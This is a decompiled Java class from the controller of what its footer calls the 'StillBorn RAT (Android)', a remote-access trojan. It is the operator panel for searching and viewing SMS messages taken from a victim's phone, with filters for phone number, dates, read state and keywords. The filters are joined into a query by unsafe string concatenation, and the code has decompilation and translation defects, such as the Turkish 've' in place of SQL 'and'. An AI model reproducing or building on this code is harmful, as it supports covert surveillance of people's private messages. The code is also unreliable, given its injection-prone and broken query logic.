/*   1:    */ package gui.panel;
/*   2:    */ 
/*   3:    */ import Packet.SMSPacket;
/*   4:    */ import gui.UserGUI;
/*   5:    */ import java.awt.Color;
/*   6:    */ import java.awt.event.ActionEvent;
/*   7:    */ import java.awt.event.ActionListener;
/*   8:    */ import java.io.PrintStream;
/*   9:    */ import java.text.DateFormat;
/*  10:    */ import java.text.ParseException;
/*  11:    */ import java.text.SimpleDateFormat;
/*  12:    */ import java.util.ArrayList;
/*  13:    */ import java.util.Date;
/*  14:    */ import javax.swing.DefaultComboBoxModel;
/*  15:    */ import javax.swing.GroupLayout;
/*  16:    */ import javax.swing.GroupLayout.Alignment;
/*  17:    */ import javax.swing.GroupLayout.ParallelGroup;
/*  18:    */ import javax.swing.GroupLayout.SequentialGroup;
/*  19:    */ import javax.swing.JButton;
/*  20:    */ import javax.swing.JComboBox;
/*  21:    */ import javax.swing.JFormattedTextField;
/*  22:    */ import javax.swing.JLabel;
/*  23:    */ import javax.swing.JPanel;
/*  24:    */ import javax.swing.JScrollPane;
/*  25:    */ import javax.swing.JSplitPane;
/*  26:    */ import javax.swing.JTextArea;
/*  27:    */ import javax.swing.JTextField;
/*  28:    */ import javax.swing.LayoutStyle.ComponentPlacement;
/*  29:    */ import javax.swing.UIManager;
/*  30:    */ import javax.swing.border.TitledBorder;
/*  31:    */ import javax.swing.text.MaskFormatter;
/*  32:    */ 
/*  33:    */ public class SMSLogPanel
/*  34:    */   extends JPanel
/*  35:    */ {
/*  36: 53 */   public static Color IN_SMS = new Color(14, 92, 7);
/*  37: 54 */   public static Color OUT_SMS = Color.blue;
/*  38:    */   private JTextArea areaKeyword;
/*  39:    */   private JFormattedTextField formattedMinDate;
/*  40:    */   private JFormattedTextField formattedMaxDate;
/*  41:    */   private JComboBox sourceBox;
/*  42:    */   private JComboBox typeBox;
/*  43:    */   private ColorPane colorPane;
/*  44:    */   private JTextField phoneNumberField;
/*  45:    */   private UserGUI gui;
/*  46:    */   
/*  47:    */   public SMSLogPanel(UserGUI gui)
/*  48:    */   {
/*  49: 70 */     this.gui = gui;
/*  50:    */     
/*  51: 72 */     JLabel lblTypes = new JLabel("Türler :");
/*  52:    */     
/*  53: 74 */     JLabel lblIncoming = new JLabel("alınan mesajlar");
/*  54: 75 */     lblIncoming.setForeground(IN_SMS);
/*  55:    */     
/*  56: 77 */     JLabel lblSent = new JLabel("gönderilen mesajlar");
/*  57: 78 */     lblSent.setForeground(OUT_SMS);
/*  58:    */     
/*  59: 80 */     JSplitPane splitPane = new JSplitPane();
/*  60: 81 */     splitPane.setResizeWeight(1.0D);
/*  61: 82 */     GroupLayout groupLayout = new GroupLayout(this);
/*  62: 83 */     groupLayout.setHorizontalGroup(
/*  63: 84 */       groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  64: 85 */       .addGroup(groupLayout.createSequentialGroup()
/*  65: 86 */       .addContainerGap()
/*  66: 87 */       .addGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  67: 88 */       .addGroup(groupLayout.createSequentialGroup()
/*  68: 89 */       .addComponent(splitPane, -1, 579, 32767)
/*  69: 90 */       .addContainerGap())
/*  70: 91 */       .addGroup(groupLayout.createSequentialGroup()
/*  71: 92 */       .addComponent(lblTypes)
/*  72: 93 */       .addGap(29)
/*  73: 94 */       .addComponent(lblIncoming)
/*  74: 95 */       .addGap(42)
/*  75: 96 */       .addComponent(lblSent)))));
/*  76:    */     
/*  77: 98 */     groupLayout.setVerticalGroup(
/*  78: 99 */       groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  79:100 */       .addGroup(groupLayout.createSequentialGroup()
/*  80:101 */       .addContainerGap()
/*  81:102 */       .addGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.BASELINE)
/*  82:103 */       .addComponent(lblTypes)
/*  83:104 */       .addComponent(lblIncoming)
/*  84:105 */       .addComponent(lblSent))
/*  85:106 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/*  86:107 */       .addComponent(splitPane)
/*  87:108 */       .addContainerGap()));
/*  88:    */     
/*  89:    */ 
/*  90:111 */     JScrollPane scrollPane = new JScrollPane();
/*  91:112 */     splitPane.setLeftComponent(scrollPane);
/*  92:    */     
/*  93:114 */     this.colorPane = new ColorPane();
/*  94:115 */     scrollPane.setViewportView(this.colorPane);
/*  95:    */     
/*  96:117 */     JPanel panel = new JPanel();
/*  97:118 */     splitPane.setRightComponent(panel);
/*  98:119 */     panel.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Opsiyonel filtreler", 4, 2, null, null));
/*  99:    */     
/* 100:121 */     JLabel lblTypeOfCall = new JLabel("SMS kaynağı :");
/* 101:    */     
/* 102:123 */     this.sourceBox = new JComboBox();
/* 103:124 */     this.sourceBox.setModel(new DefaultComboBoxModel(new String[] { "Hepsi", "Alınan", "Gönderilen" }));
/* 104:    */     
/* 105:126 */     JLabel lblPhoneNumber = new JLabel("Tel. No. :");
/* 106:    */     
/* 107:128 */     this.phoneNumberField = new JTextField();
/* 108:129 */     this.phoneNumberField.setColumns(10);
/* 109:    */     
/* 110:131 */     JLabel lblMinDate = new JLabel("(dd/mm/yyyy) tarihinden öncekiler hariç  :");
/* 111:    */     
/* 112:133 */     this.formattedMinDate = new JFormattedTextField(createFormatter("**/**/****"));
/* 113:    */     
/* 114:135 */     JLabel lblNotAfter = new JLabel("Sonrakiler hariç");
/* 115:    */     
/* 116:137 */     this.formattedMaxDate = new JFormattedTextField(createFormatter("**/**/****"));
/* 117:    */     
/* 118:139 */     JButton btnGetSMSLogs = new JButton("SMS bul");
/* 119:140 */     btnGetSMSLogs.addActionListener(new ActionListener()
/* 120:    */     {
/* 121:    */       public void actionPerformed(ActionEvent e)
/* 122:    */       {
/* 123:142 */         SMSLogPanel.this.fireGetSMS();
/* 124:    */       }
/* 125:145 */     });
/* 126:146 */     JLabel lblTypeOfSms = new JLabel("SMS türü :");
/* 127:    */     
/* 128:148 */     this.typeBox = new JComboBox();
/* 129:149 */     this.typeBox.setModel(new DefaultComboBoxModel(new String[] { "Hepsi", "Okunmamış", "Okunmuş" }));
/* 130:    */     
/* 131:151 */     JLabel lblBodyKeyword = new JLabel("Anahtar kelime :");
/* 132:    */     
/* 133:153 */     JScrollPane scrollPane_1 = new JScrollPane();
/* 134:154 */     GroupLayout gl_panel = new GroupLayout(panel);
/* 135:155 */     gl_panel.setHorizontalGroup(
/* 136:156 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 137:157 */       .addGroup(GroupLayout.Alignment.TRAILING, gl_panel.createSequentialGroup()
/* 138:158 */       .addContainerGap()
/* 139:159 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.TRAILING)
/* 140:160 */       .addComponent(scrollPane_1, GroupLayout.Alignment.LEADING, -1, 238, 32767)
/* 141:161 */       .addComponent(btnGetSMSLogs, GroupLayout.Alignment.LEADING, -1, 238, 32767)
/* 142:162 */       .addComponent(lblTypeOfCall, GroupLayout.Alignment.LEADING)
/* 143:163 */       .addComponent(this.sourceBox, GroupLayout.Alignment.LEADING, 0, 238, 32767)
/* 144:164 */       .addComponent(lblPhoneNumber, GroupLayout.Alignment.LEADING)
/* 145:165 */       .addComponent(this.phoneNumberField, -1, 238, 32767)
/* 146:166 */       .addComponent(lblMinDate, GroupLayout.Alignment.LEADING, -1, 238, 32767)
/* 147:167 */       .addComponent(this.formattedMinDate, GroupLayout.Alignment.LEADING, -1, 238, 32767)
/* 148:168 */       .addComponent(lblNotAfter, GroupLayout.Alignment.LEADING)
/* 149:169 */       .addComponent(this.formattedMaxDate, GroupLayout.Alignment.LEADING, -1, 238, 32767)
/* 150:170 */       .addComponent(lblTypeOfSms, GroupLayout.Alignment.LEADING)
/* 151:171 */       .addComponent(this.typeBox, GroupLayout.Alignment.LEADING, 0, 238, 32767)
/* 152:172 */       .addComponent(lblBodyKeyword, GroupLayout.Alignment.LEADING))
/* 153:173 */       .addContainerGap()));
/* 154:    */     
/* 155:175 */     gl_panel.setVerticalGroup(
/* 156:176 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 157:177 */       .addGroup(gl_panel.createSequentialGroup()
/* 158:178 */       .addComponent(lblTypeOfCall)
/* 159:179 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 160:180 */       .addComponent(this.sourceBox, -2, -1, -2)
/* 161:181 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 162:182 */       .addComponent(lblPhoneNumber)
/* 163:183 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 164:184 */       .addComponent(this.phoneNumberField, -2, -1, -2)
/* 165:185 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 166:186 */       .addComponent(lblMinDate)
/* 167:187 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 168:188 */       .addComponent(this.formattedMinDate, -2, -1, -2)
/* 169:189 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 170:190 */       .addComponent(lblNotAfter)
/* 171:191 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 172:192 */       .addComponent(this.formattedMaxDate, -2, -1, -2)
/* 173:193 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 174:194 */       .addComponent(lblTypeOfSms)
/* 175:195 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 176:196 */       .addComponent(this.typeBox, -2, -1, -2)
/* 177:197 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 178:198 */       .addComponent(lblBodyKeyword)
/* 179:199 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 180:200 */       .addComponent(scrollPane_1, -1, 30, 32767)
/* 181:201 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/* 182:202 */       .addComponent(btnGetSMSLogs)
/* 183:203 */       .addGap(5)));
/* 184:    */     
/* 185:    */ 
/* 186:206 */     this.areaKeyword = new JTextArea();
/* 187:207 */     scrollPane_1.setViewportView(this.areaKeyword);
/* 188:208 */     panel.setLayout(gl_panel);
/* 189:209 */     setLayout(groupLayout);
/* 190:    */   }
/* 191:    */   
/* 192:    */   protected MaskFormatter createFormatter(String s)
/* 193:    */   {
/* 194:214 */     MaskFormatter formatter = null;
/* 195:    */     try
/* 196:    */     {
/* 197:216 */       formatter = new MaskFormatter(s);
/* 198:    */     }
/* 199:    */     catch (ParseException localParseException) {}
/* 200:219 */     return formatter;
/* 201:    */   }
/* 202:    */   
/* 203:    */   private void fireGetSMS()
/* 204:    */   {
/* 205:223 */     String request = "";
/* 206:229 */     if (!this.phoneNumberField.getText().equalsIgnoreCase("")) {
/* 207:230 */       if (request.equals("")) {
/* 208:230 */         request = request + " adres = '" + this.phoneNumberField.getText() + "'";
/* 209:    */       } else {
/* 210:231 */         request = request + " ve adres = '" + this.phoneNumberField.getText() + "'";
/* 211:    */       }
/* 212:    */     }
/* 213:234 */     if ((this.formattedMinDate.getValue() != null) && 
/* 214:235 */       (!this.formattedMinDate.getValue().equals("  /  /    ")))
/* 215:    */     {
/* 216:236 */       System.out.println("Valeur min. tarihi : " + this.formattedMinDate.getValue());
/* 217:237 */       String[] res = ((String)this.formattedMinDate.getValue()).split("/");
/* 218:    */       
/* 219:    */ 
/* 220:240 */       DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");
/* 221:    */       try
/* 222:    */       {
/* 223:243 */         Date date = formatter.parse(this.formattedMinDate.getText());
/* 224:244 */         if (request.equals("")) {
/* 225:244 */           request = request + " date > " + date.getTime();
/* 226:    */         } else {
/* 227:245 */           request = request + " and date > " + date.getTime();
/* 228:    */         }
/* 229:    */       }
/* 230:    */       catch (ParseException e)
/* 231:    */       {
/* 232:247 */         this.gui.errLogTxt(new Date().getTime(), "Yanlış tarih formatı");
/* 233:    */       }
/* 234:    */     }
/* 235:252 */     if ((this.formattedMaxDate.getValue() != null) && 
/* 236:253 */       (!this.formattedMaxDate.getValue().equals("  /  /    ")))
/* 237:    */     {
/* 238:254 */       System.out.println("Valeur min. tarihi : " + this.formattedMaxDate.getValue());
/* 239:255 */       String[] res = ((String)this.formattedMaxDate.getValue()).split("/");
/* 240:    */       
/* 241:    */ 
/* 242:258 */       DateFormat formatter = new SimpleDateFormat("dd/MM/yyyy");
/* 243:    */       try
/* 244:    */       {
/* 245:261 */         Date date = formatter.parse(this.formattedMaxDate.getText());
/* 246:262 */         if (request.equals("")) {
/* 247:262 */           request = request + " date < " + date.getTime();
/* 248:    */         } else {
/* 249:263 */           request = request + " and date < " + date.getTime();
/* 250:    */         }
/* 251:    */       }
/* 252:    */       catch (ParseException e)
/* 253:    */       {
/* 254:265 */         this.gui.errLogTxt(new Date().getTime(), "Yanlış tarih formatı");
/* 255:    */       }
/* 256:    */     }
/* 257:271 */     if (this.typeBox.getSelectedIndex() != 0) {
/* 258:272 */       if (request.equals("")) {
/* 259:272 */         request = request + " read = " + (this.typeBox.getSelectedIndex() - 1);
/* 260:    */       } else {
/* 261:273 */         request = request + " and read = " + (this.typeBox.getSelectedIndex() - 1);
/* 262:    */       }
/* 263:    */     }
/* 264:276 */     if (this.sourceBox.getSelectedIndex() != 0) {
/* 265:277 */       if (request.equals("")) {
/* 266:277 */         request = request + " type = " + this.sourceBox.getSelectedIndex();
/* 267:    */       } else {
/* 268:278 */         request = request + " and type = " + this.sourceBox.getSelectedIndex();
/* 269:    */       }
/* 270:    */     }
/* 271:281 */     if (!this.areaKeyword.getText().equals("")) {
/* 272:282 */       if (request.equals("")) {
/* 273:282 */         request = request + "body like '%" + this.areaKeyword.getText() + "%'";
/* 274:    */       } else {
/* 275:283 */         request = request + " and body like '%" + this.areaKeyword.getText() + "%'";
/* 276:    */       }
/* 277:    */     }
/* 278:286 */     this.gui.fireGetSMS(request);
/* 279:    */   }
/* 280:    */   
/* 281:    */   public void updateSMS(ArrayList<SMSPacket> logsList)
/* 282:    */   {
/* 283:290 */     clearPanel();
/* 284:291 */     for (SMSPacket p : logsList)
/* 285:    */     {
/* 286:292 */       String mess = "";
/* 287:293 */       mess = mess + p.getId() + "(" + p.getThread_id() + "): ";
/* 288:294 */       if (p.getType() == 1)
/* 289:    */       {
/* 290:    */         String state;
/* 291:    */         String state;
/* 292:296 */         if (p.getRead() == 1) {
/* 293:297 */           state = "read";
/* 294:    */         } else {
/* 295:300 */           state = "unread";
/* 296:    */         }
/* 297:301 */         mess = mess + "Alınan(" + state + "): ";
/* 298:    */       }
/* 299:    */       else
/* 300:    */       {
/* 301:304 */         mess = mess + "Gönderilen: ";
/* 302:    */       }
/* 303:306 */       mess = mess + p.getAddress() + "\n";
/* 304:307 */       mess = mess + "Body:\n";
/* 305:308 */       mess = mess + p.getBody() + "\n--\n";
/* 306:309 */       mess = mess + new Date(p.getDate()).toString() + "\n\n";
/* 307:311 */       if (p.getType() == 1) {
/* 308:312 */         this.colorPane.append(IN_SMS, mess);
/* 309:313 */       } else if (p.getType() == 2) {
/* 310:314 */         this.colorPane.append(OUT_SMS, mess);
/* 311:    */       }
/* 312:    */     }
/* 313:    */   }
/* 314:    */   
/* 315:    */   public void addSMS(String txt, Color color)
/* 316:    */   {
/* 317:319 */     this.colorPane.append(color, txt);
/* 318:    */   }
/* 319:    */   
/* 320:    */   public void clearPanel()
/* 321:    */   {
/* 322:323 */     this.colorPane.setText("");
/* 323:    */   }
/* 324:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     gui.panel.SMSLogPanel
 * JD-Core Version:    0.7.0.1
 */